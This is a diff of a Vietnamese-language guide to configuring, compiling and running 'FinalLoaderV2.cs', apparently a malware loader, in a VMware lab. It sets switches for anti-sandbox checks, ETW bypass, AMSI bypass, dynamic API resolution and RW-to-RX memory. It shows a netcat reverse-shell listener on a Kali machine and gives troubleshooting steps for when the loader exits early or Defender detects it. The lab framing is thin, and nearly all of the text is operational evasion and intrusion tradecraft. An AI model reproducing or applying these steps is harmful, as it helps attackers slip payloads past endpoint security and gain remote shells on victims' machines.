@@ -5,29 +5,19 @@
 
 ## BƯỚC 0 — Cấu hình file trước khi compile
 
-Mở `FinalLoaderV2.cs`, sửa các flag sau (phù hợp lab VMware):
+Mở `FinalLoaderV2.cs`, **không cần sửa IP trong code** vì URL được truyền qua tham số khi chạy.
+
+Chỉ kiểm tra các flag — giữ nguyên mặc định:
 
 ```csharp
-const bool A1_DNS_CHECK      = true;   // Giữ — sẽ cấu hình hosts file
-const bool A2_UPTIME_CHECK   = true;   // Giữ — boot VM chờ 10 phút
-const bool A3_RAM_CHECK      = true;   // Giữ — đảm bảo VM có >= 4GB RAM
-const bool A4_TIMING_CHECK   = true;   // Giữ
-const bool A5_PROCESS_CHECK  = true;   // Giữ — đừng mở wireshark khi test
-const bool A6_MOUSE_CHECK    = false;  // TẮT — VM không có user thật di chuột
-const bool A7_VM_CHECK       = false;  // TẮT — VMware Tools sẽ luôn bị detect
-const bool A8_PARENT_CHECK   = true;   // Giữ — chạy từ cmd.exe là pass
-
-const bool B_ETW_BYPASS      = true;
-const bool C_AMSI_VEH        = true;
-const bool D_DYNAMIC_API     = true;
-const bool E_RW_RX            = true;
+const bool A_ANTISANDBOX  = true;
+const bool B_ETW_BYPASS   = true;
+const bool C_AMSI_VEH     = true;
+const bool D_DYNAMIC_API  = true;
+const bool E_RW_RX        = true;
 ```
 
-Sửa địa chỉ IP trong file:
-```csharp
-const string DNS_DOMAIN    = "check.lab.internal";
-const string DNS_EXPECT_IP = "192.168.1.100";   // ← IP máy Kali của bạn
-```
+> Không có IP hardcode trong V2. IP Kali được truyền vào lúc chạy qua tham số dòng lệnh.
 
 ---
 
@@ -150,19 +140,7 @@ nc -lvnp 4444
 
 ## BƯỚC 2 — Chuẩn bị máy TARGET (Windows 10 VM)
 
-### 2.1 Thêm DNS giả vào hosts file
-Mở `cmd` với quyền Administrator:
-```cmd
-echo 192.168.1.100 check.lab.internal >> C:\Windows\System32\drivers\etc\hosts
-```
-
-Kiểm tra:
-```cmd
-nslookup check.lab.internal
-```
-> Phải trả về `192.168.1.100`
-
-### 2.2 Kiểm tra uptime VM (phải >= 10 phút)
+### 2.1 Kiểm tra uptime VM (phải >= 10 phút)
 ```cmd
 powershell -command "[math]::Round(((Get-Date)-(gcim Win32_OperatingSystem).LastBootUpTime).TotalMinutes)"
 ```
@@ -246,12 +224,11 @@ C:\Users\...>
 ### Loader thoát ngay lập tức → Anti-sandbox fail
 ```cmd
 powershell -command "
-# Check từng điều kiện
 Write-Host 'RAM (GB):' ([math]::Round((gcim Win32_ComputerSystem).TotalPhysicalMemory/1GB,1))
 Write-Host 'Uptime (min):' ([math]::Round(((Get-Date)-(gcim Win32_OperatingSystem).LastBootUpTime).TotalMinutes))
-Write-Host 'DNS check:' (Resolve-DnsName 'check.lab.internal' -ErrorAction SilentlyContinue).IPAddress
 "
 ```
+> RAM phải >= 4, Uptime phải >= 10
 
 ### Defender detect → xem log
 ```powershell
